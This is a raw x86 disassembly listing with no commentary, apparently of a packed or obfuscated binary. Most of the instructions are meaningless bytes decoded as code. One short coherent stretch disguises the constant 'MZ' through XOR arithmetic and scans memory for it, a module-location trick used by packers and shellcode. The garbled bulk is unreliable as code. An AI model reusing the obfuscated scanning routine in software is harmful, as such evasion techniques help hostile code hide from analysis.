  41bb45:	mov    dl,0x3a
  41bb47:	and    DWORD PTR [ebx-0x7f],0x2e
  41bb4b:	iret   
  41bb4c:	xor    DWORD PTR [eax-0x1a],edx
  41bb4f:	addr16 pusha 
  41bb51:	jae    0x41bb93
  41bb53:	stos   DWORD PTR es:[edi],eax
  41bb54:	popa   
  41bb55:	jb     0x41bba0
  41bb57:	push   edi
  41bb58:	jns    0x41bb2d
  41bb5a:	and    eax,0xace6872f
  41bb5f:	push   0x1053020d
  41bb64:	push   ebp
  41bb65:	mov    cl,0xb3
  41bb67:	mov    esp,DWORD PTR ds:0x91b03e40
  41bb6d:	dec    edi
  41bb6e:	mov    eax,0xd4096ec9
  41bb73:	cs call 0x4c7f:0x35f8b46
  41bb7b:	inc    eax
  41bb7c:	jge    0x41bbde
  41bb7e:	cmc    
  41bb7f:	or     esi,ebx
  41bb81:	scas   al,BYTE PTR es:[edi]
  41bb82:	jmp    edi
  41bb84:	test   eax,0xdfcd31c9
  41bb89:	dec    esp
  41bb8a:	pop    ebp
  41bb8b:	push   ds
  41bb8c:	xchg   BYTE PTR ds:0x7c3d9987,cl
  41bb92:	(bad)  
  41bb93:	out    0x2d,eax
  41bb95:	repnz cmp al,0x2e
  41bb98:	dec    ebx
  41bb99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb9a:	push   cs
  41bb9b:	ins    DWORD PTR es:[edi],dx
  41bb9c:	xor    BYTE PTR [ebx-0x58],al
  41bb9f:	loope  0x41bc03
  41bba1:	fdiv   QWORD PTR [ecx-0x17]
  41bba4:	xor    ebp,edi
  41bba6:	push   cs
  41bba7:	and    edi,esp
  41bba9:	mov    ch,dh
  41bbab:	lds    edx,FWORD PTR [ecx+0x18399cc4]
  41bbb1:	jbe    0x41bc13
  41bbb3:	clc    
  41bbb4:	hlt    
  41bbb5:	outs   dx,DWORD PTR ds:[esi]
  41bbb6:	adc    DWORD PTR [ebp+0x7],ecx
  41bbb9:	out    0x30,al
  41bbbb:	adc    eax,DWORD PTR ss:[ebx]
  41bbbe:	outs   dx,DWORD PTR ds:[esi]
  41bbbf:	icebp  
  41bbc0:	bound  eax,QWORD PTR [eax-0x4b]
  41bbc3:	lahf   
  41bbc4:	test   eax,0x2c3b6767
  41bbc9:	stos   DWORD PTR es:[edi],eax
  41bbca:	mov    ah,0xa
  41bbcd:	daa    
  41bbce:	mov    al,0x7e
  41bbd0:	adc    al,BYTE PTR [edx-0x16]
  41bbd3:	and    dl,BYTE PTR [esi]
  41bbd5:	outs   dx,DWORD PTR ds:[esi]
  41bbd6:	add    BYTE PTR [edi+0x4d651854],al
  41bbdc:	(bad)  
  41bbdd:	mov    bh,0x43
  41bbdf:	or     BYTE PTR [esp+eax*8+0x46],cl
  41bbe3:	retf   0x3859
  41bbe6:	pusha  
  41bbe7:	dec    esi
  41bbe8:	jnp    0x41bb81
  41bbea:	lods   al,BYTE PTR ds:[esi]
  41bbeb:	cmp    DWORD PTR [ebp-0x5d],esp
  41bbee:	ja     0x41bba9
  41bbf0:	dec    ebp
  41bbf1:	scas   eax,DWORD PTR es:[edi]
  41bbf2:	push   ebx
  41bbf3:	sub    BYTE PTR ds:0xf9c6b338,dl
  41bbf9:	dec    ebp
  41bbfa:	xchg   esp,eax
  41bbfb:	or     dl,BYTE PTR [edi+edx*2-0x66a453cd]
  41bc02:	dec    edx
  41bc03:	nop
  41bc04:	push   0x4b
  41bc06:	icebp  
  41bc07:	inc    eax
  41bc08:	mov    edi,0xc6f64a46
  41bc0d:	jmp    0x524f:0x5f9d70fe
  41bc14:	mov    al,0x62
  41bc16:	retf   
  41bc17:	mov    bl,0x9f
  41bc19:	push   edx
  41bc1a:	xchg   BYTE PTR [esi],ah
  41bc1c:	test   ch,bh
  41bc1e:	xor    eax,0xb9640af7
  41bc23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc24:	xchg   ah,dl
  41bc26:	or     DWORD PTR [ebx],esi
  41bc28:	mul    DWORD PTR ds:0x4cf0df84
  41bc2e:	std    
  41bc2f:	sub    eax,0xabccf98
  41bc34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc35:	mov    ch,0xdf
  41bc37:	test   eax,0x7aac40c
  41bc3c:	das    
  41bc3d:	add    eax,0x85976cf8
  41bc42:	sbb    eax,0xa667d004
  41bc47:	adc    cl,bh
  41bc49:	ret    0xfd5d
  41bc4c:	jle    0x41bc7b
  41bc4e:	jne    0x41bc25
  41bc50:	xor    al,0x71
  41bc52:	or     dh,BYTE PTR [ebp+ebp*2+0xa76013a]
  41bc59:	mov    BYTE PTR [ecx-0x77f961fc],0x83
  41bc60:	imul   DWORD PTR [ebp-0x39c2e6b5]
  41bc66:	sbb    eax,0x943f9815
  41bc6b:	push   edx
  41bc6c:	retf   
  41bc6d:	mov    dh,0xdf
  41bc6f:	jo     0x41bce5
  41bc71:	jle    0x41bbf3
  41bc73:	(bad)
  41bc76:	aaa    
  41bc77:	retf   0x7ffe
  41bc7a:	jae    0x41bcd6
  41bc7c:	jl     0x41bccc
  41bc7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc7f:	mov    ds:0xeab4033a,eax
  41bc84:	and    esi,DWORD PTR [edi-0x1c]
  41bc87:	test   DWORD PTR [esi+0x55],ebp
  41bc8a:	fcom   DWORD PTR [edi+0x80662b6]
  41bc90:	jo     0x41bcaf
  41bc92:	sbb    eax,0x6035f26b
  41bc97:	mov    edi,DWORD PTR [edx+0x1560f63b]
  41bc9d:	mov    edx,0x8d44fce
  41bca2:	out    0xc2,eax
  41bca4:	in     al,0x72
  41bca6:	sahf   
  41bca7:	jecxz  0x41bcc2
  41bca9:	cmp    eax,0x613d4b9b
  41bcae:	ds int 0xc9
  41bcb1:	call   esp
  41bcb3:	jae    0x41bcf8
  41bcb5:	inc    eax
  41bcb6:	ret    0x5808
  41bcb9:	and    BYTE PTR [eax],al
  41bcbb:	cmp    DWORD PTR [esi],ecx
  41bcbd:	inc    edi
  41bcbe:	or     edi,DWORD PTR [esi+ecx*8-0x76]
  41bcc2:	mov    dh,0xac
  41bcc4:	leave  
  41bcc5:	jl     0x41bc9e
  41bcc7:	mov    ch,0x58
  41bcc9:	add    BYTE PTR [edx],ch
  41bccb:	fst    DWORD PTR [ecx-0x246e9a54]
  41bcd1:	cmp    BYTE PTR [edx-0x32],al
  41bcd4:	imul   eax,ecx,0x188b1caa
  41bcda:	shl    BYTE PTR [esi-0x445b7015],0xc7
  41bce1:	cmp    ah,BYTE PTR [ebp-0x40]
  41bce4:	mov    ch,BYTE PTR [eax+eiz*4]
  41bce7:	sbb    bh,BYTE PTR [eax+ecx*4+0x7c]
  41bceb:	adc    edx,esp
  41bced:	mov    ebp,ecx
  41bcef:	xor    BYTE PTR [edx+ebx*8],al
  41bcf2:	imul   BYTE PTR [ecx-0x1b25919b]
  41bcf8:	or     ebp,DWORD PTR ds:0x5225fa7
  41bcfe:	adc    cl,bl
  41bd00:	and    dh,0x9e
  41bd03:	fsub   QWORD PTR [eax+0x1d]
  41bd06:	or     DWORD PTR [ebp-0xb5302d5],edi
  41bd0c:	jge    0x41bcd3
  41bd0e:	jb     0x41bd76
  41bd10:	xlat   BYTE PTR ds:[ebx]
  41bd11:	fmul   DWORD PTR [eax-0x5d05f29c]
  41bd17:	int3   
  41bd18:	sbb    al,0x83
  41bd1a:	sar    edx,cl
  41bd1c:	push   esp
  41bd1d:	stos   BYTE PTR es:[edi],al
  41bd1e:	scas   al,BYTE PTR es:[edi]
  41bd1f:	data16 cmc 
  41bd21:	and    al,0xb7
  41bd23:	jge    0x41bd00
  41bd25:	pop    edi
  41bd26:	jle    0x41bced
  41bd28:	adc    eax,0xeb16c0db
  41bd2d:	xchg   BYTE PTR [edx-0x6a0ae345],bl
  41bd33:	mov    ebp,0x12fbe202
  41bd38:	fistp  WORD PTR [ebx+0x74]
  41bd3b:	call   DWORD PTR [edi+eiz*8-0x2ee3cb97]
  41bd42:	retf   
  41bd43:	ror    esp,0xba
  41bd46:	dec    esp
  41bd47:	shl    DWORD PTR [esi-0x606f74d7],0x36
  41bd4e:	and    DWORD PTR gs:[esi-0x1f],ebx
  41bd52:	aaa    
  41bd53:	cld    
  41bd54:	xor    esi,edx
  41bd56:	push   ss
  41bd57:	mov    ?,ebp
  41bd59:	in     al,dx
  41bd5a:	pop    edi
  41bd5b:	(bad)  
  41bd5c:	in     eax,dx
  41bd5d:	out    dx,eax
  41bd5e:	sub    al,0x13
  41bd60:	dec    esi
  41bd61:	mov    edx,0x23bea1c8
  41bd66:	sub    eax,0x8a74fcf8
  41bd6b:	cwde   
  41bd6c:	push   edi
  41bd6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd6e:	add    dh,al
  41bd70:	xchg   esi,eax
  41bd71:	leave  
  41bd72:	xor    ecx,DWORD PTR [edi-0x2e]
  41bd75:	push   ebp
  41bd76:	mov    eax,0x6093f5d9
  41bd7b:	sbb    BYTE PTR [ebp+0x2c],al
  41bd7e:	pop    eax
  41bd7f:	jg     0x41bdde
  41bd81:	fcomp  DWORD PTR [ecx-0x65c6fd91]
  41bd87:	and    BYTE PTR [ecx-0x5e],dh
  41bd8a:	dec    esp
  41bd8b:	nop
  41bd8c:	sub    eax,DWORD PTR [edi+0x79]
  41bd8f:	pop    edi
  41bd90:	xchg   BYTE PTR [edx],dh
  41bd92:	jno    0x41be0b
  41bd94:	jne    0x41bd87
  41bd96:	push   cs
  41bd97:	push   esi
  41bd98:	jp     0x41bd67
  41bd9a:	adc    al,0x7d
  41bd9c:	pop    eax
  41bd9d:	js     0x41bd3e
  41bd9f:	jg     0x41bd82
  41bda1:	dec    esp
  41bda2:	dec    edi
  41bda3:	add    edx,DWORD PTR [edi+ecx*8]
  41bda6:	adc    eax,0x5d107589
  41bdab:	(bad)  
  41bdac:	lds    edx,FWORD PTR [edi-0x13]
  41bdaf:	xchg   ebp,eax
  41bdb0:	cmc    
  41bdb1:	fisttp DWORD PTR [esi+0x48]
  41bdb4:	cdq    
  41bdb5:	cmp    eax,0xb30ec00d
  41bdba:	popa   
  41bdbb:	push   esp
  41bdbc:	pushw  cs
  41bdbe:	loop   0x41be26
  41bdc0:	xchg   esi,eax
  41bdc1:	adc    ah,0x45
  41bdc4:	adc    eax,0x279c72cd
  41bdc9:	xchg   esi,eax
  41bdca:	push   edi
  41bdcb:	stc    
  41bdcc:	jecxz  0x41bd89
  41bdce:	push   0x43f1b279
  41bdd3:	inc    ecx
  41bdd4:	data16 sub al,BYTE PTR [ebx+0x3cb53912]
  41bddb:	loop   0x41be2b
  41bddd:	push   ss
  41bdde:	pop    es
  41bddf:	loop   0x41bd93
  41bde1:	mov    ecx,0x9b7f6df0
  41bde6:	imul   ebx,edi,0x7e830430
  41bdec:	add    al,0x7
  41bdee:	jne    0x41be46
  41bdf0:	sbb    BYTE PTR [ebp+0x39],bl
  41bdf3:	fisub  WORD PTR [edx-0x62756e84]
  41bdf9:	add    DWORD PTR [ecx-0x25],edi
  41bdfc:	or     esi,DWORD PTR [ebp+0xcacf7e3]
  41be02:	fwait
  41be03:	and    eax,0xb9d6bc50
  41be08:	xchg   edi,esp
  41be0a:	int    0x5e
  41be0c:	xor    eax,0xe5944d27
  41be11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be12:	aas    
  41be13:	stc    
  41be14:	das    
  41be15:	imul   eax,esp,0xfef1e655
  41be1b:	inc    ecx
  41be1c:	pop    esi
  41be1d:	scas   eax,DWORD PTR es:[edi]
  41be1e:	js     0x41be6c
  41be20:	(bad)  
  41be21:	(bad)  
  41be22:	sbb    esp,ecx
  41be24:	imul   edi,DWORD PTR [ebx-0x6f5b9547],0xc2fe92b9
  41be2e:	imul   esi,DWORD PTR [ebx+0x31a91fd],0xdeb97567
  41be38:	fs and eax,0xaa0ca0a7
  41be3e:	(bad)  
  41be3f:	in     eax,dx
  41be40:	cmp    ah,ch
  41be42:	dec    ebx
  41be43:	lahf   
  41be44:	dec    ecx
  41be45:	jl     0x41be44
  41be47:	lea    esp,[ebx+0x6e3cb1c3]
  41be4d:	bound  eax,QWORD PTR [edi+0x54a3aadd]
  41be53:	rcl    dl,0x9d
  41be56:	jmp    0x8ea5a26c
  41be5b:	stos   DWORD PTR es:[edi],eax
  41be5c:	xchg   esi,eax
  41be5d:	or     al,0xff
  41be5f:	dec    eax
  41be60:	icebp  
  41be61:	ret    
  41be62:	push   ds
  41be63:	jle    0x41bed5
  41be65:	(bad)
  41be6a:	dec    edi
  41be6b:	xchg   edi,eax
  41be6c:	bound  esi,QWORD PTR [ecx]
  41be6e:	(bad)  
  41be6f:	(bad)  
  41be70:	or     eax,0x8758bcd2
  41be75:	dec    edi
  41be76:	add    ebx,esi
  41be78:	fsincos 
  41be7a:	xchg   esi,eax
  41be7b:	sbb    ch,bl
  41be7d:	push   edi
  41be7e:	repz (bad) 
  41be80:	jmp    0x41bec2
  41be82:	mov    ds:0x76c739da,al
  41be87:	jp     0x41be8a
  41be89:	sub    DWORD PTR [esi-0x79],ecx
  41be8c:	cwde   
  41be8d:	jmp    0x5c3d02cb
  41be92:	push   edi
  41be93:	sbb    al,0x25
  41be95:	hlt    
  41be96:	jo     0x41bf14
  41be98:	leave  
  41be99:	and    DWORD PTR [esi-0x20189e0c],esi
  41be9f:	stc    
  41bea0:	mov    cl,0xe3
  41bea2:	mov    ecx,0x18679ef0
  41bea7:	test   BYTE PTR [eax-0x23825df3],bh
  41bead:	daa    
  41beae:	mov    eax,0xb951ceb
  41beb3:	test   al,0xe1
  41beb5:	and    ebx,0x78a9cb8
  41bebb:	xor    esi,ecx
  41bebd:	mov    edi,0xffcd8d08
  41bec2:	sub    edi,esi
  41bec4:	add    DWORD PTR [eax],edi
  41bec6:	jmp    0x41bed1
  41becb:	xor    esi,ecx
  41becd:	add    esi,edx
  41becf:	add    DWORD PTR [eax],esi
  41bed1:	mov    eax,DWORD PTR [ebp-0x8]
  41bed4:	mov    esi,DWORD PTR [ebp-0x10]
  41bed7:	mov    eax,DWORD PTR [eax]
  41bed9:	xor    esi,ecx
  41bedb:	add    esi,0x3272f7
  41bee1:	mov    DWORD PTR [ebp-0x28],0x7097b859
  41bee8:	mov    DWORD PTR [ebp-0x24],ebx
  41beeb:	not    esi
  41beed:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41bef4:	mov    DWORD PTR [ebp-0x2c],ebx
  41bef7:	mov    ebx,DWORD PTR [ebp-0x28]
  41befa:	mov    edi,DWORD PTR [ebp-0x24]
  41befd:	and    eax,esi
  41beff:	mov    esi,0xa145
  41bf04:	xor    bx,si
  41bf07:	mov    esi,0x4131
  41bf0c:	add    bx,si
  41bf0f:	cmp    WORD PTR [eax],bx
  41bf12:	je     0x41bf5c
  41bf18:	mov    edi,DWORD PTR [ebp-0x10]
  41bf1b:	xor    edi,ecx
  41bf1d:	mov    DWORD PTR [ebp-0x28],0x7097b859
  41bf24:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41bf2b:	mov    ebx,0xffcd8d08
  41bf30:	sub    ebx,edi
  41bf32:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41bf39:	add    eax,ebx
  41bf3b:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41bf42:	mov    edi,DWORD PTR [ebp-0x28]
  41bf45:	mov    ebx,DWORD PTR [ebp-0x24]
  41bf48:	mov    ebx,0xa145
  41bf4d:	xor    di,bx
  41bf50:	add    di,si
  41bf53:	cmp    WORD PTR [eax],di
  41bf56:	jne    0x41bf18
  41bf5c:	mov    edi,DWORD PTR [ebp-0x14]
  41bf5f:	jmp    0x41e319
  41bf64:	retf   0xd5df
  41bf67:	pop    esi
  41bf68:	idiv   BYTE PTR [edx+0x7a]
  41bf6b:	addr16 cmp al,0xf6
  41bf6e:	push   ebx
  41bf6f:	into   
  41bf70:	sbb    al,0x28
  41bf72:	sub    ebx,0xffffffe4
  41bf75:	add    BYTE PTR [ebx+edi*2+0x18],bh
  41bf79:	sahf   
  41bf7a:	jnp    0x41bff7
  41bf7c:	in     eax,dx
  41bf7d:	pop    es
  41bf7e:	into   
  41bf7f:	and    al,0x5e
  41bf81:	jb     0x41bf5e
  41bf83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf84:	push   ebp
  41bf85:	mov    edx,0x65ec3331
  41bf8a:	aaa    
  41bf8b:	cmp    bh,BYTE PTR [ebp+0x5c168cf9]
  41bf91:	ret    0xdc7a
  41bf94:	sbb    esi,DWORD PTR [esi]
  41bf96:	jae    0x41c00f
  41bf98:	mov    ebx,0x1d80ef5e
  41bf9d:	mov    ebx,0x368be442
  41bfa2:	inc    edi
  41bfa3:	hlt    
  41bfa4:	mov    WORD PTR [ebp+0x5e],fs
  41bfa7:	les    ebp,FWORD PTR [ecx-0x3a]
  41bfaa:	sub    ebx,esp
  41bfac:	lock and bh,BYTE PTR [eax+0x38]
  41bfb0:	or     cl,BYTE PTR [eax+0x3d]
  41bfb3:	inc    esp
  41bfb4:	pop    edx
  41bfb5:	int    0x2c
  41bfb7:	and    DWORD PTR [ebp+0x4e],edx
  41bfba:	xlat   BYTE PTR ds:[ebx]
  41bfbb:	shl    BYTE PTR [ebx-0x4f],1
  41bfbe:	push   0xffffff8e
  41bfc0:	or     al,0x3c
  41bfc2:	xchg   esi,eax
  41bfc3:	call   FWORD PTR ds:0x4f6ed49
  41bfc9:	push   ss
  41bfca:	inc    esi
  41bfcb:	mov    ebp,0x9e4f6968
  41bfd0:	xchg   ebx,eax
  41bfd1:	pushf  
  41bfd2:	or     BYTE PTR [edi+0x27],dh
  41bfd5:	dec    ecx
  41bfd6:	pop    esp
  41bfd7:	ins    BYTE PTR es:[edi],dx
  41bfd8:	in     eax,dx
  41bfd9:	retf   
  41bfda:	fisub  WORD PTR [ebx+eiz*1-0xca82b9a]
  41bfe1:	or     eax,0xfced08c1
  41bfe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfe7:	adc    eax,0xdbe34c1c
  41bfec:	outs   dx,BYTE PTR ds:[esi]
  41bfed:	scas   eax,DWORD PTR es:[edi]
  41bfee:	add    dh,BYTE PTR [ebx]
  41bff0:	fdivr  DWORD PTR [edi]
  41bff2:	add    al,0xa3
  41bff4:	mov    eax,ds:0xcc56ddc8
  41bff9:	retf   0xfe69
  41bffc:	sbb    al,0x5c
  41bffe:	(bad)  
  41bfff:	pop    ebp
  41c000:	xor    eax,0x473eae64
  41c005:	les    edx,FWORD PTR [ebx+0x3734fc6a]
  41c00b:	test   DWORD PTR [esi+0x6aa60de0],eax
  41c011:	int3   
  41c012:	and    BYTE PTR [ebx],cl
  41c014:	dec    esi
  41c015:	das    
  41c016:	(bad)  
  41c017:	(bad)  
  41c018:	mov    dl,0x97
  41c01a:	push   0xc886560d
  41c01f:	popf   
  41c020:	in     al,dx
  41c021:	sub    DWORD PTR [eax-0x792d58cd],0xffffff80
  41c028:	jno    0x41c088
  41c02a:	in     al,0xb8
  41c02c:	sbb    bl,BYTE PTR [esi]
  41c02e:	xor    ebp,esp
  41c030:	xchg   edx,eax
  41c031:	in     eax,0x1e
  41c033:	shr    cl,0x1c
  41c036:	das    
  41c037:	pop    ebp
  41c038:	imul   ebp
  41c03a:	repz (bad) 
  41c03c:	jmp    0xcb6d45bf
  41c041:	(bad)  
  41c043:	stos   BYTE PTR es:[edi],al
  41c044:	outs   dx,BYTE PTR ds:[esi]
  41c045:	in     eax,0x76
  41c047:	pop    ds
  41c048:	aad    0xcd
  41c04a:	inc    ebx
  41c04b:	lods   al,BYTE PTR ds:[esi]
  41c04c:	sub    eax,0x110a8826
  41c051:	add    DWORD PTR [edi],esi
  41c053:	push   edx
  41c054:	pushf  
  41c055:	cmc    
  41c056:	ret    0xcf69
  41c059:	push   eax
  41c05a:	mov    DWORD PTR [edi],edi
  41c05c:	int3   
  41c05d:	jg     0x41c0a4
  41c05f:	cmp    BYTE PTR [edi+0x5c],ch
  41c062:	not    BYTE PTR [ebx]
  41c064:	popa   
  41c065:	repz mov ecx,0xfef99f93
  41c06b:	mov    esp,esp
  41c06d:	addr16 jb 0x41c084
  41c070:	icebp  
  41c071:	adc    dl,BYTE PTR [ebp-0x5b91e354]
  41c077:	shr    BYTE PTR [ebx],0x3c
  41c07a:	xchg   ecx,eax
  41c07b:	ss call 0x963be6da
  41c081:	cmp    ebp,DWORD PTR [esi-0xb]
  41c084:	in     eax,0xc0
  41c086:	pusha  
  41c087:	mov    edx,0x6c744942
  41c08c:	add    ecx,0x2e
  41c08f:	outs   dx,DWORD PTR ds:[esi]
  41c090:	shl    DWORD PTR [ecx],cl
  41c092:	mov    edx,es
  41c094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c095:	loopne 0x41c054
  41c097:	test   al,0xda
  41c099:	jle    0x41c088
  41c09b:	or     eax,0x449add84
  41c0a0:	add    al,0xf
  41c0a2:	sar    bl,1
  41c0a4:	jge    0x41c043
  41c0a6:	lods   eax,DWORD PTR ds:[esi]
  41c0a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0a8:	nop
  41c0a9:	ss call 0xef01:0x1af375b3
  41c0b1:	fs loope 0x41c12e
  41c0b4:	mov    bh,0x57
  41c0b6:	jl     0x41c08b
  41c0b8:	bound  esp,QWORD PTR [edi-0x57]
  41c0bb:	call   0x9a8e:0x1b260d80
  41c0c2:	sub    BYTE PTR [ebx-0x7a],bh
  41c0c5:	add    DWORD PTR [edx+0x78],eax
  41c0c8:	retf   0xa1c9
  41c0cb:	jecxz  0x41c0df
  41c0cd:	mov    dh,0x90
  41c0cf:	adc    DWORD PTR [esi-0x40],eax
  41c0d2:	dec    ecx
  41c0d3:	jo     0x41c0e1
  41c0d5:	(bad)  [esi]
  41c0d7:	xlat   BYTE PTR ds:[ebx]
  41c0d8:	shr    BYTE PTR [ebx-0x6647bff9],1
  41c0de:	out    dx,eax
  41c0df:	xchg   edi,eax
  41c0e0:	mov    bl,0xb4
  41c0e2:	out    0xc9,eax
  41c0e4:	les    edi,FWORD PTR [edi+0x7d062c7b]
  41c0ea:	pop    ebp
  41c0eb:	inc    edx
  41c0ec:	xchg   DWORD PTR es:[edi],ecx
  41c0ef:	and    al,0xad
  41c0f1:	(bad)  
  41c0f2:	loopne 0x41c130
  41c0f4:	mov    ebx,0xa9ffe118
  41c0f9:	add    eax,0x8d4165cb
  41c0fe:	mov    ds:0x4c1e205f,eax
  41c103:	mov    ds:0x5c218f15,al
  41c108:	cmp    al,0x56
  41c10a:	sub    DWORD PTR [ebp-0x2d],eax
  41c10d:	aad    0x87
  41c10f:	xchg   ebp,eax
  41c110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c111:	pop    edi
  41c112:	xchg   esi,eax
  41c113:	dec    esi
  41c114:	inc    ebx
  41c115:	xchg   esi,eax
  41c116:	gs push 0x994ad5cb
  41c11c:	xchg   BYTE PTR [eax+0x640d1bf7],bl
  41c122:	and    BYTE PTR [edx-0x4668083f],ah
  41c128:	lods   eax,DWORD PTR ds:[esi]
  41c129:	clc    
  41c12a:	xchg   edi,eax
  41c12b:	imul   ebp,DWORD PTR [ecx+0x53420e39],0xffffffa7
  41c132:	test   al,0xe4
  41c134:	jmp    0x42bd:0xdf6a40cb
  41c13b:	cs push esp
  41c13d:	add    eax,0xa958098e
  41c142:	stc    
  41c143:	push   eax
  41c144:	sbb    eax,0x686f1807
  41c149:	ins    BYTE PTR es:[edi],dx
  41c14a:	adc    ch,al
  41c14c:	lods   al,BYTE PTR ds:[esi]
  41c14d:	jecxz  0x41c161
  41c14f:	push   ebp
  41c150:	shl    BYTE PTR [eax+0x41],0x8d
  41c154:	pop    edi
  41c155:	fld    QWORD PTR [edi-0x40cbf253]
  41c15b:	jl     0x41c181
  41c15d:	jle    0x41c126
  41c15f:	cmp    esp,DWORD PTR [edx+0x60]
  41c162:	sti    
  41c163:	push   ss
  41c164:	push   ebx
  41c165:	sbb    eax,0x8ca32a2a
  41c16a:	jo     0x41c0f0
  41c16c:	cmp    bl,BYTE PTR [ebp+0x1f]
  41c16f:	sbb    BYTE PTR [eax+0x1],cl
  41c172:	mov    ah,0x91
  41c174:	nop
  41c175:	dec    ebx
  41c176:	or     eax,0xf280d981
  41c17b:	mov    ds:0x88f260c1,eax
  41c180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c181:	addr16 jns 0x41c1c4
  41c184:	in     eax,dx
  41c185:	dec    esp
  41c186:	fsin   
  41c188:	push   ebp
  41c189:	rcl    DWORD PTR [ecx-0x48],0x97
  41c18d:	leave  
  41c18e:	or     eax,0xaf9de57c
  41c193:	lds    edx,FWORD PTR [ebp-0x7c3882eb]
  41c199:	out    0x5a,al
  41c19b:	repz cs in al,0x6d
  41c19f:	in     eax,dx
  41c1a0:	push   eax
  41c1a1:	mov    ch,0x9e
  41c1a3:	dec    edi
  41c1a4:	sbb    ebx,ebx
  41c1a6:	loop   0x41c1e8
  41c1a8:	sbb    bl,BYTE PTR [ecx+0x2c]
  41c1ab:	(bad)  
  41c1ac:	pushf  
  41c1ad:	dec    edi
  41c1ae:	dec    ebp
  41c1af:	or     bh,bh
  41c1b1:	jl     0x41c1b8
  41c1b3:	xchg   edi,eax
  41c1b4:	adc    al,0xa9
  41c1b6:	into   
  41c1b7:	and    al,0xef
  41c1b9:	xor    BYTE PTR [ebx+0x12],al
  41c1bc:	clc    
  41c1bd:	jbe    0x41c14f
  41c1bf:	adc    eax,0xe4219bb6
  41c1c4:	stos   DWORD PTR es:[edi],eax
  41c1c5:	out    0x8f,al
  41c1c7:	pop    eax
  41c1c8:	and    eax,0x8ee0a8f4
  41c1cd:	mov    eax,0xc8e16e11
  41c1d2:	jl     0x41c1c9
  41c1d4:	lods   eax,DWORD PTR ds:[esi]
  41c1d5:	mov    eax,ds:0xe0994cb3
  41c1da:	popa   
  41c1db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1dc:	sub    DWORD PTR [edx],0x45
  41c1df:	outs   dx,BYTE PTR ds:[esi]
  41c1e0:	test   BYTE PTR [edi],0xc6
  41c1e3:	aaa    
  41c1e4:	pop    ecx
  41c1e5:	mov    BYTE PTR [ecx+0x59],ah
  41c1e8:	out    0xfc,al
  41c1ea:	xor    DWORD PTR [edx],edi
  41c1ec:	mov    al,0x7d
  41c1ee:	sub    ah,0x7f
  41c1f1:	pop    edi
  41c1f2:	xor    al,0x71
  41c1f4:	mov    DWORD PTR [edx-0x10],ebx
  41c1f7:	aaa    
  41c1f8:	into   
  41c1f9:	ins    BYTE PTR es:[edi],dx
  41c1fa:	mov    eax,ds:0x7764dfb8
  41c1ff:	popa   
  41c200:	mov    ah,0x64
  41c202:	jp     0x41c25c
  41c204:	push   ebx
  41c205:	sbb    bl,ah
  41c207:	inc    ebp
  41c208:	call   0x3fb9:0x9de7b7fd
  41c20f:	js     0x41c1b2
  41c211:	aam    0x83
  41c213:	jg     0x41c206
  41c215:	jbe    0x41c1dd
  41c217:	scas   al,BYTE PTR es:[edi]
  41c218:	sub    BYTE PTR [ecx],cl
  41c21a:	mov    bh,0xe9
  41c21c:	sub    eax,0x716d3b04
  41c221:	dec    eax
  41c222:	in     al,0x9a
  41c224:	inc    BYTE PTR [eax+0x76e1967a]
  41c22a:	dec    esp
  41c22b:	stos   BYTE PTR es:[edi],al
  41c22c:	push   esp
  41c22d:	jg     0x41c1d3
  41c22f:	mov    dl,0xbf
  41c231:	dec    edi
  41c232:	popf   
  41c233:	sub    DWORD PTR ds:0x70140beb,edx
  41c239:	mov    BYTE PTR [ebp-0x71],dl
  41c23c:	sub    DWORD PTR [ecx-0x3f74704c],eax
  41c242:	and    ebx,DWORD PTR [ebx]
  41c244:	sbb    eax,0x921741d2
  41c249:	sti    
  41c24a:	push   esi
  41c24b:	fcmovnb st,st(1)
  41c24d:	cli    
  41c24e:	add    BYTE PTR [esi],bh
  41c250:	mov    DWORD PTR ds:0x641d0a5f,edi
  41c256:	scas   al,BYTE PTR es:[edi]
  41c257:	test   DWORD PTR [edx-0x7a238c0c],ebx
  41c25d:	mov    bh,0x9e
  41c25f:	popf   
  41c260:	imul   edx,DWORD PTR [ecx+eiz*4-0x5],0xcd096c64
  41c268:	iret   
  41c269:	push   cs
  41c26a:	add    dh,0x98
  41c26d:	mov    bl,BYTE PTR [eax+esi*8+0x16]
  41c271:	sar    BYTE PTR ds:0x32f232f9,0xb3
  41c278:	mov    bl,0x97
  41c27a:	mov    dh,BYTE PTR [ecx+ebp*1+0x20]
  41c27e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c27f:	fistp  WORD PTR [esi]
  41c281:	cdq    
  41c282:	jno    0x41c248
  41c284:	(bad)  
  41c285:	into   
  41c286:	clc    
  41c287:	arpl   WORD PTR [ebx-0x4c],bx
  41c28a:	xor    ecx,DWORD PTR [edi+eax*1+0x4ba68ecb]
  41c291:	imul   ebp,DWORD PTR [ecx+0x35],0xffffffc2
  41c295:	pop    ecx
  41c296:	sahf   
  41c297:	test   al,0xe5
  41c299:	xor    al,0x1b
  41c29b:	repz in eax,0x95
  41c29e:	shl    DWORD PTR [ecx+0x54],1
  41c2a1:	arpl   WORD PTR [ebx+ecx*4+0x1c],bx
  41c2a5:	jmp    0x41c2db
  41c2a7:	jmp    0x707f:0x7bc2724c
  41c2ae:	jno    0x41c251
  41c2b0:	dec    esi
  41c2b1:	jo     0x41c255
  41c2b3:	into   
  41c2b4:	dec    esi
  41c2b5:	sbb    BYTE PTR [ebp+eiz*1-0x2f],dl
  41c2b9:	fxam   
  41c2bb:	sub    bh,ch
